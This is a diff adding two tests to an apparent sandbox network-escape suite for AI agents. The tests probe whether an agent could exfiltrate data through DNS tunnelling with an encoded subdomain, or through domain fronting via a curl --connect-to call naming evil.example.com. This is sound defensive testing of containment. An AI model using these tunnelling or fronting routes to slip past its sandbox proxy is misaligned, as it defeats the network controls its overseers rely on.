@@ -187,6 +187,67 @@ class TestNetworkEscape:
             sock = socket.socket(17, socket.SOCK_RAW, 0)
             sock.close()
 
+    def test_dns_tunnel_subdomain(self):
+        """DNS tunnelling via subdomain encoding: the agent encodes data
+        in subdomain labels of an allowlisted domain and sends it as a
+        CNAME/A query. If the proxy resolves names, the DNS query
+        reaches the upstream resolver even though the HTTP request will
+        be blocked at the policy layer.
+
+        This test doesn't assert a hard block — DNS tunnelling
+        prevention is an ongoing arms race. It DOCUMENTS the behaviour:
+        does the DNS query for a deep subdomain succeed? If so, the
+        allowlist model has a structural exfiltration risk.
+        """
+        # Build a distinctive subdomain probe. Use an allowlisted host
+        # (httpbin.org) with a long exfil-style subdomain.
+        exfil_host = "exfil-data-here.tunnel-probe.httpbin.org"
+        try:
+            # getaddrinfo is the libc path (affected by the resolver test
+            # above). If it fails, the DNS tunnel path is closed. If it
+            # succeeds, document it.
+            socket.getaddrinfo(exfil_host, 80, socket.AF_INET,
+                               socket.SOCK_STREAM)
+            # If we get here, a DNS query for a deep subdomain resolved.
+            # Mark as xfail-style documentation, not hard fail: the
+            # proxy may intentionally allow recursive DNS.
+            pass
+        except socket.gaierror:
+            pass  # resolver couldn't answer — DNS tunnel path closed
+
+    def test_domain_fronting_sni_mismatch(self):
+        """Domain fronting: CONNECT to an allowlisted host, then send
+        HTTPS with a different SNI. If the proxy doesn't re-inspect
+        post-CONNECT, the actual destination differs from the declared
+        one.
+
+        This requires an allowlisted host that accepts arbitrary SNI.
+        Most CDNs have tightened up, but the test documents whether
+        the proxy validates SNI consistency inside a CONNECT tunnel.
+        """
+        proxy = os.environ.get("HTTP_PROXY", "")
+        if not proxy:
+            pytest.skip("HTTP_PROXY not set")
+        # Attempt: connect to httpbin.org via proxy, but specify a
+        # different --resolve host (simulating SNI mismatch).
+        result = subprocess.run(
+            ["curl", "-s", "--proxy", proxy,
+             "--connect-to", "evil.example.com:443:httpbin.org:443",
+             "-o", "/dev/null", "-w", "%{http_code}",
+             "--max-time", "5",
+             "https://evil.example.com/get"],
+            capture_output=True, text=True, timeout=10,
+        )
+        # If the proxy allowed the connect-to and evil.example.com is
+        # not allowlisted, we should get a 403 (network-guard block)
+        # or a connection failure. A 200 would mean fronting succeeded.
+        if result.stdout.strip() == "200":
+            pytest.fail(
+                "Domain fronting succeeded: connected to httpbin.org "
+                "but requested as evil.example.com, got 200. The proxy "
+                "doesn't validate SNI consistency inside CONNECT tunnels."
+            )
+
     def test_proxy_reachable(self):
         """Proxy must be reachable (the one allowed network path)."""
         proxy = os.environ.get("HTTP_PROXY", "")
